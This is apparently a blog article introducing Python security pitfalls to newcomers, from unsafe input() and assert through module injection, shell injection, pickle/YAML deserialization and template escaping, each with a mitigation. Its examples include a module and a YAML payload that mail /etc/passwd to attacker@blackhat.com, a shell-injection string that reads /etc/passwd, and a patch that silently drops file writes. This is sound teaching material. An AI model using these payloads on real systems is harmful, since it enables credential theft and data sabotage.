# A bite of Python

Ilya Etingof published on 2016-09-07T13:30:00+00:00, last updated
2016-09-07T13:47:02+00:00

Being easy to pick up and progress quickly towards developing larger and more
complicated applications, Python is becoming increasingly ubiquitous in
computing environments. Though apparent language clarity and friendliness
could lull the vigilance of software engineers and system administrators --
luring them into coding mistakes that may have serious security implications.
In this article, which primarily targets people who are new to Python, a
handful of security-related quirks are looked at; experienced developers may
well be aware of the peculiarities that follow.

## Input function

In a large collection of Python 2 built-in functions,
[input](https://docs.python.org/2/library/functions.html#input) is a total
security disaster. Once called, whatever is read from stdin gets immediately
evaluated as Python code:

[code]

       $ python2
        >>> input()
        dir()
        ['__builtins__', '__doc__', '__name__', '__package__']
       >>> input()
       __import__('sys').exit()
       $
    
[/code]

Clearly, the `input` function must never ever be used unless data on a
script's stdin is fully trusted. Python 2 documentation suggests `raw_input`
as a safe alternative. In Python 3 the `input` function becomes equivalent to
`raw_input`, thus fixing this weakness once and forever.

## Assert statement

There is a coding idiom of using `assert` statements for catching next to
impossible conditions in a Python application.

[code]

       def verify_credentials(username, password):
           assert username and password, 'Credentials not supplied by caller'
    
           ... authenticate possibly null user with null password ...
    
[/code]

However, Python does not produce any instructions for `assert` statements when
compiling source code into optimized byte code (e.g. python -O). That silently
removes whatever protection against malformed data that the programmer wired
into their code leaving the application open to attacks.

The root cause of this weakness is that the [`assert`
mechanism](https://docs.python.org/3/reference/simple_stmts.html#the-assert-
statement) is designed purely for testing purposes, as is done in C++.
Programmers must use other means for ensuring data consistency.

## Reusable integers

Everything is an object in Python. Every object has a unique identity which
can be read by the [id
function](https://docs.python.org/2/library/functions.html#id). To figure out
if two variables or attributes are pointing to the same object the `is`
operator can be used. Integers are objects so the `is` operation is indeed
defined for them:

[code]

        >>> 999+1 is 1000
        False
    
[/code]

If the outcome of the above operation looks surprising, keep in mind that the
`is` operator works with identities of two objects -- it does not compare
their numerical, or any other, values. However:

[code]

        >>> 1+1 is 2
        True
    
[/code]

The explanation for this behavior is that Python maintains a pool of objects
representing the first few hundred integers and reuses them to save on memory
and object creation. To make it even more confusing, the definition of what
"small integer" is differs across Python versions.

A mitigation here is to never use the `is` operator for value comparison. The
`is` operator is designed to deal exclusively with object identities.

## Floats comparison

Working with floating point numbers may get complicated due to inherently
limited precision and differences stemming from decimal versus binary fraction
representation. One common cause of confusion is that float comparison may
sometimes yield unexpected result. Here's a famous example:

[code]

       >>> 2.2 * 3.0 == 3.3 * 2.0
       False
    
[/code]

The cause of the above phenomena is indeed a rounding error:

[code]

       >>> (2.2 * 3.0).hex()
       '0x1.a666666666667p+2'
       >>> (3.3 * 2.0).hex()
       '0x1.a666666666666p+2'
    
[/code]

Another interesting observation is related to the Python `float` type which
supports the notion of infinity. One could reason that everything is smaller
than infinity:

[code]

       >>> 10**1000000 > float('infinity')
       False
    
[/code]

However, up to Python 3, a type object beats the infinity:

[code]

       >>> float > float('infinity')
       True
    
[/code]

The best mitigation is to stick to integer arithmetic whenever possible. The
next best approach would be to use the
[decimal](https://docs.python.org/3/library/decimal.html) stdlib module which
attempts to shield users from annoying details and dangerous flaws.

Generally, when important decisions are made based on the outcome of
arithmetic operations, care must be taken not to fall victim to a rounding
error. See the [issued and
limitations](https://docs.python.org/3/tutorial/floatingpoint.html) chapter in
Python documentation.

## Private attributes

Python does not support object attributes hiding. But there is a workaround
based on the feature of [double underscored
attributes](https://docs.python.org/3/tutorial/classes.html#tut-private)
mangling. Although changes to attribute names [occur only to
code](https://docs.python.org/3/reference/expressions.html#atom-identifiers),
attributes names hardcoded into string constants remain unmodified. This may
lead to confusing behavior when a double underscored attribute visibly "hides"
from `getattr()`/`hasattr()` functions.

[code]

       >>> class X(object):
       ...   def __init__(self):
       ...     self.__private = 1
       ...   def get_private(self):
       ...     return self.__private
       ...   def has_private(self):
       ...     return hasattr(self, '__private')
       ... 
       >>> x = X()
       >>>
       >>> x.has_private()
       False
       >>> x.get_private()
       1
    
[/code]

For this privacy feature to work, attribute mangling is not performed on
attributes out of class definition. That effectively "splits" any given double
underscored attributive onto two depending on from where it is being
referenced:

[code]

       >>> class X(object):
       ...   def __init__(self):
       ...     self.__private = 1
       >>>
       >>> x = X()
       >>>
       >>> x.__private
       Traceback
       ...
       AttributeError: 'X' object has no attribute '__private'
       >>>
       >>> x.__private = 2
       >>> x.__private
       2
       >>> hasattr(x, '__private')
       True
    
[/code]

These quirks could turn into a security weakness if a programmer relies on
double underscored attributes for making important decisions in their code
without paying attention to the asymmetrical behavior of private attributes.

## Module injection

Python modules importing system is powerful and complicated. Modules and
packages can be imported by file or directory name found in search path as
defined by [sys.path](https://docs.python.org/3/library/sys.html#sys.path)
list. Search path initialization is an intricate process which is also
dependent on Python version, platform and local configuration. To mount
successful attack on a Python application, an attacker needs to find a way to
smuggle a malicious Python module into a directory or importable package file
which Python would consider when trying to import a module.

The mitigation is to maintain secure access permissions on all directories and
package files in search path to ensure unprivileged users do not have write
access to them. Keep in mind that the directory where the initial script
invoking Python interpreter resides is automatically inserted into the search
path.

Running script like this reveals actual search path:

[code]

       $ cat myapp.py
       #!/usr/bin/python
    
       import sys
       import pprint
    
       pprint.pprint(sys.path)
    
[/code]

On Windows platform, instead of script location, current working directory of
the Python process is [injected](https://docs.python.org/3/using/windows.html
#finding-modules) into the search path. On UNIX platforms, current working
directory is automatically inserted into `sys.path` whenever program code is
read from stdin or command line ("-" or "-c" or "-m" options):

[code]

       $ echo "import sys, pprint; pprint.pprint(sys.path)" | python -
       ['',
        '/usr/lib/python3.3/site-packages/pip-7.1.2-py3.3.egg',
        '/usr/lib/python3.3/site-packages/setuptools-20.1.1-py3.3.egg',
        ...]
       $ python -c 'import sys, pprint; pprint.pprint(sys.path)'
       ['',
        '/usr/lib/python3.3/site-packages/pip-7.1.2-py3.3.egg',
        '/usr/lib/python3.3/site-packages/setuptools-20.1.1-py3.3.egg',
        ...]
       $
       $ cd /tmp
       $ python -m myapp
       ['',
        '/usr/lib/python3.3/site-packages/pip-7.1.2-py3.3.egg',

        ...]

To mitigate the risk of module injection from current working directory
explicitly changing directory to a safe one is recommended prior to running
Python on Windows or passing code through command line.

Another possible source for the search path is the contents of the
`$PYTHONPATH` environment variable. An easy mitigation against `sys.path`
population from process environment is the `-E` option to Python interpreter
which makes it ignoring `$PYTHONPATH` variable.

## Code execution on import

It may not look obvious that the `import` statement actually leads to
execution of the code in the module being imported. That is why even importing
mistrustful module or package is risky. Importing simple module like this may
lead to unpleasant consequences:

[code]

       $ cat malicious.py
       import os
       import sys
    
       os.system('cat /etc/passwd | mail attacker@blackhat.com')
    
       del sys.modules['malicious']  # pretend it's not imported
       $ python
       >>> import malicious
       >>> dir(malicious)
       Traceback (most recent call last):
       NameError: name 'malicious' is not defined
    
[/code]

Combined with `sys.path` entry injection attack, it may pave the way to
further system exploitation.

## Monkey patching

A process of changing Python objects attributes at run-time is known as monkey
patching. Being a dynamic language, Python fully supports run-time program
introspection and code mutation. Once a malicious module gets imported one way
or another, any existing mutable object could be insensibly monkey patched
without programmer's consent. Consider this:

[code]

       $ cat nowrite.py
       import builtins
    
       def malicious_open(*args, **kwargs):
          if len(args) > 1 and args[1] == 'w':
             args = ('/dev/null',) + args[1:]
          return original_open(*args, **kwargs)
    
       original_open, builtins.open = builtins.open, malicious_open
    
[/code]

If the code above gets executed by Python interpreter, everything written into
files won't be stored on the filesystem:

[code]

       >>> import nowrite
       >>> open('data.txt', 'w').write('data to store')
       5
       >>> open('data.txt', 'r')
       Traceback (most recent call last):
       ...
       FileNotFoundError: [Errno 2] No such file or directory: 'data.txt'
    
[/code]

Attacker could leverage Python garbage collector (`gc.get_objects()`) to get
hold of all objects in existence and hack any of them.

In Python 2 built-in objects can be accesses via the magic `__builtins__`
module. One of the known tricks, exploiting `__builtins__` mutability, that
might bring the world to its end is:

[code]

       >>> __builtins__.False, __builtins__.True = True, False
       >>> True
       False
       >>> int(True)
       0
    
[/code]

In Python 3 assignments to `True` and `False` won't work so they can't be
manipulated that way.

Functions are first-class objects in Python, they maintain references to many
properties of a function. In particular, executable byte code is referenced by
the `__code__` attribute which, of course, can be modified:

[code]

       >>> import shutil
       >>>
       >>> shutil.copy
       <function copy at 0x7f30c0c66560>
       >>> shutil.copy.__code__ = (lambda src, dst: dst).__code__
       >>>
       >>> shutil.copy('my_file.txt', '/tmp')
       '/tmp'
       >>> shutil.copy
       <function copy at 0x7f30c0c66560>
       >>>
    
[/code]

Once the above monkey patch is applied, despite `shutil.copy` function still
looking sane, it silently stopped working due to the no-op lambda function
code set to it.

Type of Python object is determined by the `__class__` attribute. Evil
attacker could hopelessly mess up things by resorting to changing type of live
objects:

[code]

       >>> class X(object): pass
       ... 
       >>> class Y(object): pass
       ... 
       >>> x_obj = X()
       >>> x_obj
       <__main__.X object at 0x7f62dbe5e010>
       >>> isinstance(x_obj, X)
       True
       >>> x_obj.__class__ = Y
       >>> x_obj
       <__main__.Y object at 0x7f62dbe5d350>
       >>> isinstance(x_obj, X)
       False
       >>> isinstance(x_obj, Y)
       True
       >>> 
    
[/code]

The only mitigation against malicious monkey patching is to ensure the
authenticity and integrity of the Python modules being imported.

## Shell injection via subprocess

Being known as a glue language, it is quite common for a Python script to
delegate system administration tasks to other programs by asking the operating
system to execute them, possibly providing additional parameters. The
[subprocess](https://docs.python.org/3/library/subprocess.html) module offers
easy to use and quite high-level service for such tasks.

[code]

       >>> from subprocess import call
       >>>
       >>> unvalidated_input = '/bin/true'
       >>> call(unvalidated_input)
       0
    
[/code]

But there is a catch! To make use of UNIX shell services, like command line
parameters expansion, the `shell` keyword argument to the `call` function
should be turned into `True`. Then the first argument to `call` function is
passed as-is to the system shell for further parsing and interpretation. Once
unvalidated user input reaches the `call` function (or other functions
implemented in the `subprocess` module), a hole is opened to the underlying
system resources.

[code]

       >>> from subprocess import call
       >>>
       >>> unvalidated_input = '/bin/true'
       >>> unvalidated_input += '; cut -d: -f1 /etc/passwd'
       >>> call(unvalidated_input, shell=True)
       root
       bin
       daemon
       adm
       lp
       0
    
[/code]

It is obviously much safer not to invoke UNIX shell for external command
execution by leaving the `shell` keyword in its default `False` state and
supplying a vector of command and its parameters to the `subprocess`
functions. In this second invocation form, neither command nor its parameters
are interpreted or expanded by shell.

[code]

       >>> from subprocess import call
       >>>
       >>> call(['/bin/ls', '/tmp'])
    
[/code]

If the nature of the application dictates the use of UNIX shell services, it
is utterly important to sanitize everything that goes to `subprocess` making
sure that no unwanted shell functionality can be exploited by malicious users.
In newer Python versions, shell escaping can be done with the standard
library's
[shlex.quote](https://docs.python.org/3/library/shlex.html#shlex.quote)
function.

## Temporary files

While vulnerabilities based on improper use of temporary files strike many
programming languages, they are still surprisingly common in Python scripts so
it's probably worth mentioning here.

Vulnerabilities of this kind leverage insecure file system access permissions,
possibly involving intermediate steps, ultimately leading to data
confidentiality or integrity issues. Detailed description of the problem in
general can be found in
[CWE-377](http://cwe.mitre.org/data/definitions/377.html).

Luckily, Python is shipped with the `tempfile` module in its standard library
which offers high-level functions for creating temporary file names "in the
most secure manner possible". Beware the flawed `tempfile.mktemp`
implementation which is still present in the library for backward
compatibility reasons. The `tempfile.mktemp` function must never be used!
Instead, use `tempfile.TemporaryFile`, or `tempfile.mkstemp` if you need the
temporary file to persist after it is closed.

Another possibility of accidentally introducing a weakness is through the use
of `shutil.copyfile` function. The problem here is that destination file is
[created](https://github.com/python/cpython/blob/master/Lib/shutil.py#L115) in
the most insecure manner possible.

Security-savvy developer may consider first copying the source file into a
random temporary file name, then renaming the temporary file to its final
name. While this may look like a good plan, it can be rendered insecure by the
`shutil.move` function if it is used for performing the renaming. Trouble is
that if the temporary file is created on a file system other than the one
where the final file is to reside, `shutil.move` will fail to move it
atomically (via `os.rename`) and silently resort to the insecure
`shutil.copy`. A mitigation would be to prefer `os.rename` over `shutil.move`
as `os.rename` is guaranteed to fail explicitly on operations across file
system boundaries.

Further complications may arise from the inability of `shutil.copy` to copy
all file meta data potentially leaving the created file unprotected.

Not exclusively specific to Python, care must be taken when modifying files on
file systems of non-mainstream types, especially remote ones. Data consistency
guarantees tend to differ in the area of file access serialization. As an
example, NFSv2 does not honour the
[O_EXCL](https://docs.python.org/3/library/os.html#os.O_EXCL) flag to the
`open` system call, which is crucial for atomic file creation.

## Insecure deserialization

Many data serialization techniques exist, among them
[Pickle](https://docs.python.org/3/library/pickle.html) is designed
specifically to de/serialize Python objects. Its goal is to dump live Python
objects into an octet stream for storage or transmission, then reconstruct
them back to possibly another instance of Python. The reconstruction step is
inherently risky if serialized data is tampered with. The insecurity of Pickle
is well recognized and clearly noted in Python documentation.

Being a popular configuration file format, YAML is not necessarily perceived
as a powerful serialization protocol capable of tricking a deserializer into
executing arbitrary code. What makes it even more dangerous is that the de
facto default YAML implementation for Python -
[PyYAML](http://pyyaml.org/wiki/PyYAMLDocumentation) makes deserialization
look very innocent:

[code]

       >>> import yaml
       >>>
       >>> dangerous_input = """
       ... some_option: !!python/object/apply:subprocess.call
       ...   args: [cat /etc/passwd | mail attacker@blackhat.com]
       ...   kwds: {shell: true}
       ... """
       >>> yaml.load(dangerous_input)
       {'some_option': 0}
    
[/code]

...while /etc/passwd is being stolen. A suggested fix is to always use
`yaml.safe_load` for handling YAML serialization you can't trust. Still, the
current PyYAML default feels somewhat provoking considering other
serialization libraries tend to use `dump`/`load` function names for similar
purposes, but in a safe manner.

## Templating engines

Web application authors adopted Python long ago. Over the course of a decade,
quite a number of Web frameworks have been developed. Many of them utilize
[templating engines](https://wiki.python.org/moin/Templating) for generating
dynamic web contents from, well, templates and runtime variables. Aside from
web applications, templating engines found their way into completely different
software such as the Ansible IT automation tool.

When content is being rendered from static templates and runtime variables,
there is a risk of user-controlled code injection through runtime variables. A
successfully mounted attack against a web application may lead to a [cross-
site scripting](https://en.wikipedia.org/wiki/Cross-site_scripting)
vulnerability. Usual mitigation for server-side template injection is to
sanitize the contents of template variables before it interpolates into the
final document. The sanitization can be done by denying, stripping off or
escaping characters that are special to any given markup or other domain-
specific language.

Unfortunately, templating engines do not seem to lean towards tighter security
here -- looking at the most popular implementations, neither of them apply
escaping mechanism by default, relying on a developer's awareness of the
risks.

For example, [Jinja2](http://jinja.pocoo.org/), which is probably one of the
most popular tools, renders everything:

[code]

       >>> from jinja2 import Environment
       >>>
       >>> template = Environment().from_string('')
       >>> template.render(variable='<script>do_evil()</script>')
       '<script>do_evil()</script>'
    
[/code]

...unless one of many possible escaping mechanisms is explicitly engaged by
reversing its default settings:

[code]

       >>> from jinja2 import Environment
       >>>
       >>> template = Environment(autoescape=True).from_string('')
       >>> template.render(variable='<script>do_evil()</script>')
       '&lt;script&gt;do_evil()&lt;/script&gt;'
    
[/code]

An additional complication is that, in certain use-cases, programmers do not
want to sanitize all template variables, intentionally leaving some of them
holding potentially dangerous content intact. Templating engines address that
need by introducing "filters" to let programmers explicitly sanitize the
contents of individual variables. Jinja2 also offers a possibility of toggling
the escaping default on a per-template basis.

It can get even more fragile and complicated if developers choose to escape
only a subset of markup language tags letting others legitimately sneaking
into the final document.

## Conclusion

This blog post is not meant to be a comprehensive list of all potential traps
and shortcomings specific to the Python ecosystem. The goal is to raise
awareness of security risks that may come into being once one starts coding in
Python, hopefully making programming more enjoyable, and our lives more
secure.
